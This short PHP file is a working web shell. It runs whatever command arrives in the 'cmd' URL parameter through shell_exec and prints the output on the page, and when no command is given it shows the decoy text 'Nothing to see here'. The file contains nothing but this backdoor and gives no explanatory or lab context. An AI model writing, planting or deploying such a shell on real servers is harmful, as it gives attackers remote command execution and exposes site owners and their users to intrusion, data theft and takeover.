<?php 

if(isset($_GET['cmd'])) {
    $cmd = shell_exec($_GET['cmd']);
}
else {
    $cmd = "Nothing to see here";
}
?>

<pre>
   <?php echo $cmd; ?>
</pre>
